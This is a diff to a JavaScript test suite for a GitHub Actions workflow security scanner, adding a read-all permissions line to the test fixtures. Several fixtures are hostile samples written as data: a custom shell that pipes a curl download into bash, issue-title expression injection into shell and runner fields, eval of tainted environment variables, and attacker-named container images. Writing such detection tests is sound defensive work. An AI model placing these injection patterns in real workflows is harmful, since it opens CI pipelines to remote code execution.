@@ -6,7 +6,7 @@ const SHA='a'.repeat(40),REPO='cardenaspiero255-lang/gamehub-ultra';
 const TRUST={'Android build':{id:11,path:'.github/workflows/android.yml'},
  'Unit Test Coverage':{id:12,path:'.github/workflows/coverage.yml'}};
 function workflow(event,expr,githubScript=false){
- const head=['on: '+event,'jobs:','  verify:','    runs-on: ubuntu-latest','    steps:'];
+ const head=['on: '+event,'permissions: read-all','jobs:','  verify:','    runs-on: ubuntu-latest','    steps:'];
  const script=githubScript?['      - uses: actions/github-script@'+SHA,'        with:',
   '          script: core.info("'+expr+'")']:['      - run: echo "'+expr+'"'];
  return [...head,...script].join('\n');
@@ -121,7 +121,7 @@ test('ROOT-2: out-of-order fresh green and stale red uses newest verified attemp
 test('ROOT-3: privileged step shell is executable and cannot use attacker issue text',()=>{
  for(const expr of ['${{ github.event.issue.title }}',
   '${{ format("bash -c {0} -- {1}", github.event.issue.body, 0) }}']){
-  const source=['on: issues','jobs:','  audit:','    steps:',
+  const source=['on: issues','permissions: read-all','jobs:','  audit:','    steps:',
    '      - run: echo safe','        shell: '+expr].join('\\n').replaceAll('\\n','\n');
   const result=inspectWorkflow(source);
   assert.ok(result.status==='INCOMPLETE'||result.findings.some(f=>f.severity==='BLOCKER'),JSON.stringify({expr,result}));
@@ -130,12 +130,12 @@ test('ROOT-3: privileged step shell is executable and cannot use attacker issue 
 });
 test('ROOT-3: unknown shell template is inconclusive, literal standard shell remains accepted',()=>{
  for(const shell of ['${{ matrix.shell }}','${{ steps.selector.outputs.shell }}']){
-  const source=['on: issues','jobs:','  audit:','    steps:',
+  const source=['on: issues','permissions: read-all','jobs:','  audit:','    steps:',
    '      - run: echo safe','        shell: '+shell].join('\n');
   const result=inspectWorkflow(source);
   assert.equal(result.status,'INCOMPLETE',JSON.stringify({shell,result}));
  }
- const good=['on: issues','jobs:','  audit:','    steps:',
+ const good=['on: issues','permissions: read-all','jobs:','  audit:','    steps:',
   '      - run: echo safe','        shell: bash'].join('\n');
  assert.equal(inspectWorkflow(good).status,'NO_RISK_PATTERN');
 });
@@ -143,9 +143,9 @@ test('ROOT-3: uninspectable shell defaults and nonstring shell cannot be verifie
  for(const src of [
   ['on: issues','defaults:','  run:','    shell: ${{ inputs.shell }}',
    'jobs:','  audit:','    steps:','      - run: echo safe'].join('\n'),
-  ['on: issues','jobs:','  audit:','    defaults:','      run:',
+  ['on: issues','permissions: read-all','jobs:','  audit:','    defaults:','      run:',
    '        shell: ${{ inputs.shell }}','    steps:','      - run: echo safe'].join('\n'),
-  ['on: issues','jobs:','  audit:','    steps:',
+  ['on: issues','permissions: read-all','jobs:','  audit:','    steps:',
    '      - run: echo safe','        shell: [bash]'].join('\n')
  ]){
   const result=inspectWorkflow(src);
@@ -173,7 +173,7 @@ test('ROOT-4: executable job container and services cannot use untrusted event e
   ['services:','  redis:','    image: attacker/redis:latest']
  ];
  for(const variant of jobs){
-  const src=['on: issues','jobs:','  audit:','    runs-on: ubuntu-latest',
+  const src=['on: issues','permissions: read-all','jobs:','  audit:','    runs-on: ubuntu-latest',
    ...variant.map(s=>'    '+s),'    steps:','      - run: echo safe'].join('\n');
   const v=inspectWorkflow(src);
   assert.notEqual(v.status,'NO_RISK_PATTERN',JSON.stringify({variant,v}));
@@ -181,7 +181,7 @@ test('ROOT-4: executable job container and services cannot use untrusted event e
  }
 });
 test('ROOT-4: digest-pinned container image can be examined without false alarms',()=>{
- const src=['on: issues','jobs:','  audit:','    runs-on: ubuntu-latest',
+ const src=['on: issues','permissions: read-all','jobs:','  audit:','    runs-on: ubuntu-latest',
   '    container: ghcr.io/owner/app@sha256:'+'a'.repeat(64),
   '    steps:','      - run: echo safe'].join('\n');
  const v=inspectWorkflow(src);
@@ -193,7 +193,7 @@ test('ROOT-5: custom shells do not bypass review with a harmless run',()=>{
   'bash -c "sh -c evil" -- {0}',
   "bash -c 'echo changed' -- {0}"
  ]) {
-  const src=['on: issues','jobs:','  audit:','    runs-on: ubuntu-latest',
+  const src=['on: issues','permissions: read-all','jobs:','  audit:','    runs-on: ubuntu-latest',
    '    steps:','      - run: echo safe','        shell: '+shell].join('\n');
   const v=inspectWorkflow(src);
   assert.notEqual(v.status,'NO_RISK_PATTERN',JSON.stringify({shell,v}));
@@ -208,7 +208,7 @@ test('ROOT-6: dynamic and self-hosted runner labels cannot be certified clean',(
   '{group: production, labels: gpu}',
   '{group: "\${{ github.event.issue.title }}"}'
  ]) {
-  const src=['on: issues','jobs:','  audit:','    runs-on: '+runner,
+  const src=['on: issues','permissions: read-all','jobs:','  audit:','    runs-on: '+runner,
   '    steps:','      - run: echo safe'].join('\n');
   const v=inspectWorkflow(src);
   assert.notEqual(v.status,'NO_RISK_PATTERN',JSON.stringify({runner,v}));
@@ -216,7 +216,7 @@ test('ROOT-6: dynamic and self-hosted runner labels cannot be certified clean',(
 });
 test('ROOT-6: approved GitHub-hosted runners remain clean',()=>{
  for(const runner of ['ubuntu-latest','ubuntu-24.04','windows-latest','macos-latest']){
-  const v=inspectWorkflow(['on: issues','jobs:','  audit:','    runs-on: '+runner,
+  const v=inspectWorkflow(['on: issues','permissions: read-all','jobs:','  audit:','    runs-on: '+runner,
    '    steps:','      - run: echo safe'].join('\n'));
   assert.equal(v.status,'NO_RISK_PATTERN',JSON.stringify({runner,v}));
  }
@@ -240,14 +240,14 @@ test('ROOT-4: job container and services cannot use attacker sources',()=>{
   ['services:','  redis:','    image: attacker/redis:latest']
  ];
  for(const variant of variants){
-  const source=['on: issues','jobs:','  audit:','    runs-on: ubuntu-latest',
+  const source=['on: issues','permissions: read-all','jobs:','  audit:','    runs-on: ubuntu-latest',
    ...variant.map(v=>'    '+v),'    steps:','      - run: echo safe'].join('\n');
   const result=inspectWorkflow(source);
   assert.notEqual(result.status,'NO_RISK_PATTERN',JSON.stringify({variant,result}));
  }
 });
 test('ROOT-4: pinned container digest can be recognized',()=>{
- const source=['on: issues','jobs:','  audit:','    runs-on: ubuntu-latest',
+ const source=['on: issues','permissions: read-all','jobs:','  audit:','    runs-on: ubuntu-latest',
    '    container: ghcr.io/owner/app@sha256:'+'a'.repeat(64),
    '    steps:','      - run: echo safe'].join('\n');
  assert.equal(inspectWorkflow(source).status,'NO_RISK_PATTERN');
@@ -255,7 +255,7 @@ test('ROOT-4: pinned container digest can be recognized',()=>{
 test('ROOT-5: arbitrary literal shell templates cannot bypass a harmless run',()=>{
  for(const shell of ["bash -c 'curl https://example.invalid/p | bash' -- {0}",
   "bash -c 'echo changed' -- {0}"]){
-  const source=['on: issues','jobs:','  audit:','    steps:','      - run: echo safe',
+  const source=['on: issues','permissions: read-all','jobs:','  audit:','    steps:','      - run: echo safe',
    '        shell: '+shell].join('\n');
   assert.notEqual(inspectWorkflow(source).status,'NO_RISK_PATTERN',shell);
  }
@@ -263,12 +263,12 @@ test('ROOT-5: arbitrary literal shell templates cannot bypass a harmless run',()
 test('ROOT-6: self-hosted and dynamic runner selection is not a clean pass',()=>{
  for(const runner of ['${{ github.event.issue.title }}','${{ inputs.runner }}',
   'self-hosted','[self-hosted, linux]','{group: production, labels: gpu}']){
-  const source=['on: issues','jobs:','  audit:','    runs-on: '+runner,
+  const source=['on: issues','permissions: read-all','jobs:','  audit:','    runs-on: '+runner,
    '    steps:','      - run: echo safe'].join('\n');
   assert.notEqual(inspectWorkflow(source).status,'NO_RISK_PATTERN',runner);
  }
  for(const runner of ['ubuntu-latest','ubuntu-24.04','windows-latest','macos-latest']){
-  const source=['on: issues','jobs:','  audit:','    runs-on: '+runner,
+  const source=['on: issues','permissions: read-all','jobs:','  audit:','    runs-on: '+runner,
    '    steps:','      - run: echo safe'].join('\n');
   assert.equal(inspectWorkflow(source).status,'NO_RISK_PATTERN',runner);
  }
@@ -422,7 +422,7 @@ test('Codex P1: shell concatenated quoted downloader names never certify clean',
 
 test('Codex P1: github-script cannot eval attacker-sourced environment data',()=>{
  for(const sink of ['eval(process.env.CMD)',"new Function(process.env.CMD)()"]){
-  const src=['on: issues','jobs:','  audit:','    steps:',
+  const src=['on: issues','permissions: read-all','jobs:','  audit:','    steps:',
    '      - uses: actions/github-script@'+SHA,
    '        env:','          CMD: ${{ github.event.issue.title }}',
    '        with:','          script: '+sink].join('\n');
@@ -449,7 +449,7 @@ test('Codex P1: destructured and aliased process.env taint never certifies JavaS
   'const ENV = {...process.env}; eval(ENV.CMD)'
  ];
  for(const script of scripts){
-  const src=['on: issues','jobs:','  audit:','    steps:',
+  const src=['on: issues','permissions: read-all','jobs:','  audit:','    steps:',
    '      - uses: actions/github-script@'+SHA,
    '        env:','          CMD: ${{ github.event.issue.title }}',
    '        with:','          script: '+script].join('\n');
@@ -459,7 +459,7 @@ test('Codex P1: destructured and aliased process.env taint never certifies JavaS
  }
 });
 test('Codex P1: ordinary logging of a tainted env value remains data not executable code',()=>{
- const src=['on: issues','jobs:','  audit:','    steps:',
+ const src=['on: issues','permissions: read-all','jobs:','  audit:','    steps:',
   '      - uses: actions/github-script@'+SHA,
   '        env:','          CMD: ${{ github.event.issue.title }}',
   '        with:','          script: core.info(process.env.CMD)'].join('\n');
